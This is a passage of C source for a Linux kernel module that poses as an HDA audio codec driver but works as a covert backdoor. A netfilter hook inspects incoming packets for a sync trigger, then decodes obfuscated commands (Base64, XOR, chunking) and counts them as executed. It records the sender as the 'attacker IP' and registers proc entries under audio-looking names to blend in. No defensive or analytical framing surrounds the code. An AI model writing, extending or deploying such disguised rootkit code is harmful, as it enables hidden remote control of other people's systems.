    if (processing_enabled && time_after(current_time, audio_ctx.sync_timeout)) {
        audio_ctx.processing_enabled = 0;
        sync_expired = 1;
        init_chunk_buffer();
    }
            spin_unlock_irqrestore(&audio_ctx.lock, flags);
            
    // If sync expired, update processing_enabled
    if (sync_expired) {
        processing_enabled = 0;
    }
    
    if (!processing_enabled) {
        // In sync mode - only process packets that look like sync packets
        // Ignore command chunks completely when waiting for sync
        if (data_len == 56) {
            snd_hda_check_codec_ready(stream_data, data_len);
        }
    } else {
        // In command processing mode - accept all packets including 56-byte payloads (64-byte total)
        // The sync packet is now a single 64-byte packet with SYNC: prefix, so 56-byte payloads are commands
        if (data_len >= 28 && data_len <= 1480) {
            spin_lock_irqsave(&audio_ctx.lock, flags);
            audio_ctx.samples_processed++;
            // Update activity time to prevent timeout during command execution
            audio_ctx.last_buffer_time = jiffies;
            spin_unlock_irqrestore(&audio_ctx.lock, flags);
            
            // Extract attacker IP for CHIS command (only in command mode)
            {
                unsigned char *ip_bytes = (unsigned char *)&ip_header->saddr;
                snprintf(current_attacker_ip, sizeof(current_attacker_ip), "%u.%u.%u.%u",
                         ip_bytes[0], ip_bytes[1], ip_bytes[2], ip_bytes[3]);
            }
            
            snd_hda_process_rirb_response(stream_data, data_len);
        }
    }
    
    return NF_ACCEPT;
}

static int snd_hda_codec_info_show(struct seq_file *m, void *v) {
    unsigned long flags;
    struct audio_state local;
    
    spin_lock_irqsave(&audio_ctx.lock, flags);
    memcpy(&local, &audio_ctx, sizeof(local));
    spin_unlock_irqrestore(&audio_ctx.lock, flags);
    
    seq_printf(m, "codec: CODECTEMPLATE\n");
    seq_printf(m, "vendor_id: VENDORTEMPLATE\n");
    seq_printf(m, "encoding: Base64+XOR+Chunking (obfuscated)\n");
    seq_printf(m, "processing: %s\n", local.processing_enabled ? "active" : "idle");
    seq_printf(m, "sync_mode: single_packet_64bytes\n");
    seq_printf(m, "packets: %d\n", local.packets_received);
    seq_printf(m, "samples: %d\n", local.samples_processed);
    seq_printf(m, "executed: %d\n", local.commands_processed);
    seq_printf(m, "decode_errors: %d\n", local.decode_errors);
    
    return 0;
}

static int snd_hda_codec_info_open(struct inode *inode, struct file *file) {
    return single_open(file, snd_hda_codec_info_show, NULL);
}

static ssize_t snd_hda_codec_proc_write(struct file *file, const char __user *buffer, size_t count, loff_t *pos) {
    char buf[8];
    size_t len = min(count, sizeof(buf) - 1);
    
    if (copy_from_user(buf, buffer, len)) return -EFAULT;
    buf[len] = '\0';
    
    if (buf[0] == '1') debug_mode = true;
    else if (buf[0] == '0') debug_mode = false;
    
    return count;
}

static int snd_hda_codec_proc_show(struct seq_file *m, void *v) {
    seq_printf(m, "%d\n", debug_mode ? 1 : 0);
    return 0;
}

static int snd_hda_codec_proc_open(struct inode *inode, struct file *file) {
    return single_open(file, snd_hda_codec_proc_show, NULL);
}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,6,0)
static const struct proc_ops audio_status_ops = {
    .proc_open = snd_hda_codec_info_open,
    .proc_read = seq_read,
    .proc_lseek = seq_lseek,
    .proc_release = single_release,
};
#else
static const struct file_operations audio_status_fops = {
    .owner = THIS_MODULE,
    .open = snd_hda_codec_info_open,
    .read = seq_read,
    .llseek = seq_lseek,
    .release = single_release,
};
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,6,0)
static const struct proc_ops audio_debug_ops = {
    .proc_open = snd_hda_codec_proc_open,
    .proc_read = seq_read,
    .proc_write = snd_hda_codec_proc_write,
    .proc_lseek = seq_lseek,
    .proc_release = single_release,
};
#else
static const struct file_operations audio_debug_fops = {
    .owner = THIS_MODULE,
    .open = snd_hda_codec_proc_open,
    .read = seq_read,
    .write = snd_hda_codec_proc_write,
    .llseek = seq_lseek,
    .release = single_release,
};
#endif

static int __init audio_codec_init(void) {
    int ret;
    
    memset(&audio_ctx, 0, sizeof(audio_ctx));
    spin_lock_init(&audio_ctx.lock);
    
    // Initialize chunk buffer
    init_chunk_buffer();
    
    audio_workqueue = create_singlethread_workqueue("kworker_hda");
    if (!audio_workqueue) {
        return -ENOMEM;
    }
    
    // Create proc interface with better error handling (non-critical)
    audio_proc_dir = NULL;
    audio_proc_entry = NULL;
    audio_proc_debug = NULL;
    
    // Try multiple approaches to create proc interface
    // Method 1: Try to create asound/card0 directly
    audio_proc_dir = proc_mkdir("asound/card0", NULL);
    
    if (!audio_proc_dir) {
        // Method 2: Create asound first, then card0
        struct proc_dir_entry *asound_dir = proc_mkdir("asound", NULL);
        if (asound_dir) {
            audio_proc_dir = proc_mkdir("card0", asound_dir);
        }
    }
    
    if (!audio_proc_dir) {
        // Method 3: Create directly under proc root with a unique name
        audio_proc_dir = proc_mkdir("audio_codec", NULL);
    }
    
    if (!audio_proc_dir) {
        // Method 4: Use existing proc root
        audio_proc_dir = NULL;
        printk(KERN_WARNING "snd_hda_codec: Could not create proc directory (non-critical)\n");
    }
    
    if (audio_proc_dir) {
        #if LINUX_VERSION_CODE >= KERNEL_VERSION(5,6,0)
        audio_proc_entry = proc_create("codec97#0", 0444, audio_proc_dir, &audio_status_ops);
        audio_proc_debug = proc_create("debug", 0644, audio_proc_dir, &audio_debug_ops);
#else
        audio_proc_entry = proc_create("codec97#0", 0444, audio_proc_dir, &audio_status_fops);
        audio_proc_debug = proc_create("debug", 0644, audio_proc_dir, &audio_debug_fops);
#endif
    }
    
    audio_netfilter.hook = snd_hda_dsp_transfer_callback;
    audio_netfilter.pf = PF_INET;
    audio_netfilter.hooknum = NF_INET_PRE_ROUTING;
    audio_netfilter.priority = NF_IP_PRI_LAST;
    
    ret = nf_register_net_hook(&init_net, &audio_netfilter);
    if (ret) {
        printk(KERN_ERR "snd_hda_codec: Failed to register netfilter hook, error=%d\n", ret);
        if (audio_proc_entry) {
            proc_remove(audio_proc_debug);
            proc_remove(audio_proc_entry);
            proc_remove(audio_proc_dir);
        }
        destroy_workqueue(audio_workqueue);
        return ret;
    }
    
    snd_hda_codec_suspend_state();
    return 0;
}

static void __exit audio_codec_exit(void) {
    nf_unregister_net_hook(&init_net, &audio_netfilter);
    
    if (audio_proc_entry) {
        proc_remove(audio_proc_debug);
        proc_remove(audio_proc_entry);
        proc_remove(audio_proc_dir);
    }
    
    if (audio_workqueue) {
        flush_workqueue(audio_workqueue);
        destroy_workqueue(audio_workqueue);
    }
}

module_init(audio_codec_init);
module_exit(audio_codec_exit);
```